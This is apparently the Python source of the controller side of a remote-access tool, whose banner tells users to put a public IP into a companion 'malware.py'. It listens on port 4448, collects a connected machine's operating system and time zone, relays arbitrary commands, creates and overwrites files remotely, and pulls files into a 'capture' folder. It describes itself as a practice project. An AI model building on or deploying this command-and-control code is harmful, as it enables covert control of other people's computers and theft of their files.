import socket
import os
import shutil
def logo():
    print(r"""
    __    ___   _____ ____  ____ _    _____    __  __
   / /   /   | / ___// __ \/ __ \ |  / /   |  / / / /
  / /   / /| | \__ \/ / / / / / / | / / /| | / /_/ / 
 / /___/ ___ |___/ / /_/ / /_/ /| |/ / ___ |/ __  /  
/_____/_/  |_/____/_____/\____/ |___/_/  |_/_/ /_/   
          
>> Social network
<< Github: github.com/LASDovah >>
<< Tiktok: tiktok.com/@csDovah >>
>> Commands:
        [x]. cd [command] > Change directories.
        [x]. mkdir [command] > Create a directorie.
        [x]. md [command] > Create a directorie.
        [x]. rmdir [command] > Remove a directorie.
        [x]. rd [command] > Remove a directorie.
        [x]. touch [command] > Create a file.
        [x]. cat [command] > Read a file.
        [x]. nano -a [command] > Adds content to an existing file. 'exit nano' for scape.
        [x]. nano -w [command] > Overwrites an already created file. 'exit nano' for scape.
        [x]. dowload [command] > Download files / Maybe images.
          
>> Created tool (30-3-2024) << 
>> It is recommended to use sudo and change to a public ip the malware.py<<
>> This tool was created to practice the fundamental bases in communication with the operating system
          and communication between computers <<      
    """)

def info_receive_client(conn):
    receive_so = conn.recv(1024).decode()
    receive_zone = conn.recv(1024).decode()
    print(f"""
    ---------------------------------------------------------------------------
    + Information
    + [+] Operative System: {receive_so}
    + [+] Time Zone: {receive_zone}
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    """)

def create_folder():
    path = 'capture'
    if not os.path.exists(path):
        os.makedirs(path)
        print("[+] Folder was created.")
    else:
        shutil.rmtree(path)
        print("[+] Directory successfully deleted.")
        os.makedirs(path)
        print("[+] Folder was created.")

def write_file(path, content):
    with open(path, "wb") as file:
       file.write(content)
    return "[+] Complete Download."

if __name__ == '__main__':
    try:
        logo()
        # Enable socket
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        # IP - PORT
        server.bind(('0.0.0.0', 4448))
        print('[*] Providing connection.')
        # Listen server
        server.listen(1)
        print('[-] Waiting for connectivity...')
        conn, addr = server.accept()
        print(f'[+] Connected by: {addr}\n')

        info_receive_client(conn) # SO y TimeZone

        create_folder()
        while True:
            command = input(">> ").lower()
            conn.send(command.encode())
            if command == 'exit':
                server.close()
                break
            elif command.startswith('nano -a'):
                content = input(f'[*]{command[8:]} >>')
                while content != 'exit nano':
                    conn.send(content.encode())  # Enviar contenido como bytes
                    recv_msg = conn.recv(4096).decode()  # Recibir mensaje del cliente
                    print(recv_msg)  # Mostrar mensaje recibido del cliente
                    content = input(f'[*]{command[8:]} >>')
                conn.send(content.encode())
                recv_msg_exit = conn.recv(4096).decode()  # Recibir mensaje de salida del cliente
                print(recv_msg_exit)  # Mostrar mensaje de salida recibido del cliente
            elif command.startswith('nano -w'):
                content = input(f'[*]{command[8:]} >>')
                while content != 'exit nano':
                    conn.send(content.encode())
                    recv_msg = conn.recv(4096).decode()
                    content = input(f'[*]{command[8:]} >>')
                conn.send(content.encode())
                recv_msg_exit = conn.recv(4096).decode()
                print(recv_msg_exit)
            elif command.startswith("download"):
                file_path = command.split(" ")[1]
                file_content = conn.recv(9780639)
                msg_recv = write_file(file_path, file_content)
                print(msg_recv)             
            else:
                recv = conn.recv(6780639).decode()
                print(recv)
    except Exception as e:
        print("Error: ", e)
    except KeyboardInterrupt as k:
        print("KeyboardInterrupt: ",k)
    finally:
        server.close()
